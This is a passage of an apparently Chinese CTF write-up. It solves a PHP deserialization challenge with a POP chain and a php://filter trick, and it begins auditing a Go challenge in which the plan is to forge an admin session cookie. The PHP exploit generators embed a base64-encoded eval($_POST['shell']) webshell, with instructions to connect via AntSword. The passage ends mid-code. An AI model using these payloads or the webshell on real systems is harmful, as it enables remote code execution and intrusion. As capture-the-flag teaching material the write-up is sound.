punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Flag</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">dosomething</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'./flag,php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"barking for fun!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token variable\">$code</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>       <span class=\"token keyword\">echo</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"no way, fuck off\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token delimiter important\">?></span></span> </pre></td></tr><tr><td data-num=\"45\"></td><td><pre>no way, fuck off</pre></td></tr></table></figure><p>这道题的 pop 链很简单，通过 echo 函数触发 Start 类中的__toString 函数，再触发 CTF 类中的 dosomething 函数，最后通过 file_put_contents 写入文件即可，难点就在于绕过 die 死亡函数。</p>\n<p>可以参考这篇文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzI2NjU2NS5odG1s\">探索 php 伪协议以及死亡绕过</span></p>\n<p>可以用 strip_tags 绕过，因为死亡代码实际上是 XML 标签，既然是 XML 标签，就可以利用 strip_tags 函数去除它，而 php://filter 刚好是支持这个方法的。</p>\n<p>但是要写入的一句话木马也是 XML 标签，在用到 strip_tags 时也会被去除。所以注意到在写入文件的时候，filter 是支持多个过滤器的。可以先将 webshell 经过 base64 编码，strip_tags 去除死亡 exit 之后，再通过 base64-decode 复原。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Start</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$barking</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">CTF</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$part1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$part2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Flag</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Flag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">CTF</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">barking</span><span class=\"token operator\">=</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">barking</span><span class=\"token operator\">=</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$c</span><span class=\"token operator\">-></span><span class=\"token property\">part1</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'php://filter/string.strip_tags|convert.base64-decode/resource=a.php'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token variable\">$c</span><span class=\"token operator\">-></span><span class=\"token property\">part2</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'PD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddKTs/Pg=='</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>或者不使用 strip_tags 标签，直接用 base64 解码，前面部分由于乱码不会执行，但是得注意 base64 算法解码时是 4 个 byte 一组</p>\n<p>除去 &lt;?!&quot; 空格；这些不在 base64 表里的字符还剩下 26 个字符 ，需要凑两个字符组成 28 个字符 7 组</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Start</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$barking</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">CTF</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$part1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$part2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Flag</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Flag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">CTF</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">barking</span><span class=\"token operator\">=</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">barking</span><span class=\"token operator\">=</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$c</span><span class=\"token operator\">-></span><span class=\"token property\">part1</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'php://filter/convert.base64-decode/resource=a.php'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token variable\">$c</span><span class=\"token operator\">-></span><span class=\"token property\">part2</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'aaPD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddKTs/Pg=='</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>传入后访问 a.php，使用蚁剑连接即可，密码 shell。</p>\n<h3 id=\"week3gogogo\"><a class=\"anchor\" href=\"#week3gogogo\">#</a> [WEEK3]gogogo</h3>\n<p>这道题涉及到 go 代码审计，简单审计下代码：</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//main.go</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">package</span> main</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token string\">\"main/route\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token string\">\"github.com/gin-gonic/gin\"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\tr <span class=\"token operator\">:=</span> gin<span class=\"token punctuation\">.</span><span class=\"token function\">Default</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\tr<span class=\"token punctuation\">.</span><span class=\"token function\">GET</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/\"</span><span class=\"token punctuation\">,</span> route<span class=\"token punctuation\">.</span>Index<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\tr<span class=\"token punctuation\">.</span><span class=\"token function\">GET</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/readflag\"</span><span class=\"token punctuation\">,</span> route<span class=\"token punctuation\">.</span>Readflag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\tr<span class=\"token punctuation\">.</span><span class=\"token function\">Run</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0.0.0.0:8000\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>分析一下，就是给了两个路由。</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//route.go</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">package</span> route</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token string\">\"github.com/gin-gonic/gin\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token string\">\"github.com/gorilla/sessions\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token string\">\"main/readfile\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token string\">\"net/http\"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token string\">\"os\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token string\">\"regexp\"</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">var</span> store <span class=\"token operator\">=</span> sessions<span class=\"token punctuation\">.</span><span class=\"token function\">NewCookieStore</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token function\">byte</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span><span class=\"token function\">Getenv</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"SESSION_KEY\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">Index</span><span class=\"token punctuation\">(</span>c <span class=\"token operator\">*</span>gin<span class=\"token punctuation\">.</span>Context<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tsession<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> store<span class=\"token punctuation\">.</span><span class=\"token function\">Get</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>Request<span class=\"token punctuation\">,</span> <span class=\"token string\">\"session-name\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\thttp<span class=\"token punctuation\">.</span><span class=\"token function\">Error</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>Writer<span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">.</span><span class=\"token function\">Error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> http<span class=\"token punctuation\">.</span>StatusInternalServerError<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t<span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token keyword\">if</span> session<span class=\"token punctuation\">.</span>Values<span class=\"token punctuation\">[</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token string\">\"admin\"</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\tsession<span class=\"token punctuation\">.</span>Values<span class=\"token punctuation\">[</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"user\"</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\terr <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span><span class=\"token function\">Save</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>Request<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">.</span>Writer<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t\thttp<span class=\"token punctuation\">.</span><span class=\"token function\">Error</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>Writer<span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">.</span><span class=\"token function\">Error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> http<span class=\"token punctuation\">.</span>StatusInternalServerError<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\tc<span class=\"token punctuation\">.</span><span class=\"token function\">String</span><span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Hello, User. How to become admin?\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">Readflag</span><span class=\"token punctuation\">(</span>c <span class=\"token operator\">*</span>gin<span class=\"token punctuation\">.</span>Context<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\tsession<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> store<span class=\"token punctuation\">.</span><span class=\"token function\">Get</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>Request<span class=\"token punctuation\">,</span> <span class=\"token string\">\"session-name\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t\thttp<span class=\"token punctuation\">.</span><span class=\"token function\">Error</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>Writer<span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">.</span><span class=\"token function\">Error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> http<span class=\"token punctuation\">.</span>StatusInternalServerError<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t\t<span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t<span class=\"token keyword\">if</span> session<span class=\"token punctuation\">.</span>Values<span class=\"token punctuation\">[</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"admin\"</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t\tc<span class=\"token punctuation\">.</span><span class=\"token function\">String</span><span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Congratulation! You are admin,But how to get flag?\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t\tpath <span class=\"token operator\">:=</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">Query</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"filename\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t\treg <span class=\"token operator\">:=</span> regexp<span class=\"token punctuation\">.</span><span class=\"token function\">MustCompile</span><span class=\"token punctuation\">(</span><span class=\"token string\">`[b-zA-Z_@#%^&amp;*:&#123;|&#125;+&lt;>\";\\[\\]]`</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> reg<span class=\"token punctuation\">.</span><span class=\"token function\">MatchString</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t\t\thttp<span class=\"token punctuation\">.</span><span class=\"token function\">Error</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>Writer<span class=\"token punctuation\">,</span> <span class=\"token string\">\"nonono\"</span><span class=\"token punctuation\">,</span> http<span class=\"token punctuation\">.</span>StatusInternalServerError<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\t\t<span class=\"token keyword\">var</span> data <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> path <span class=\"token operator\">!=</span> <span class=\"token string\">\"\"</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t\t\tdata <span class=\"token operator\">=</span> readfile<span class=\"token punctuation\">.</span><span class=\"token function\">ReadFile</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\t\t\tdata <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token function\">byte</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请传入参数\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\t\tc<span class=\"token punctuation\">.</span><span class=\"token function\">JSON</span><span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">,</span> gin<span class=\"token punctuation\">.</span>H<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\t\t\t<span class=\"token string\">\"success\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"read: \"</span> <span class=\"token operator\">+</span> <span class=\"token function\">string</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\t\tc<span class=\"token punctuation\">.</span><span class=\"token function\">String</span><span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Hello, User. How to become admin?\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>可以看到，这里将判断是否携带了 cookie，如果 cookie 中的 name 为空，就将其设置为 user。并且有一个细节，无论是否是管理员，根路由永远都会返回</p>\n<p>想到需要伪造 session</p>\n<p>上面通过获取环境变量中的 SESSION_KEY 来获取生成 <code>secure cookie</code> 。只能对 SESSION_KEY 进行猜测，猜测并未设置 SESSION_KEY。在本地运行程序，将 SESSION_KEY 置为空从而伪造 cookie。</p>\n<p>这里将 <code>route.go</code>  修改一下</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">var</span> store <span class=\"token operator\">=</span> sessions<span class=\"token punctuation\">.</span><span class=\"token function\">NewCookieStore</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token function\">byte</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span><span class=\"token function\">Getenv</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"SESSION_KEY\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">Index</span><span class=\"token punctuation\">(</span>c <span class=\"token operator\">*</span>gin<span class=\"token punctuation\">.</span>Context<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        session<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> store<span class=\"token punctuation\">.</span><span class=\"token function\">Get</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>Request<span class=\"token punctuation\">,</span> <span class=\"token string\">\"session-name\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                http<span class=\"token punctuation\">.</span><span class=\"token function\">Error</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>Writer<span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">.</span><span class=\"token function\">Error</span><span class=\"token punctuation\">(</span><span class=\"token 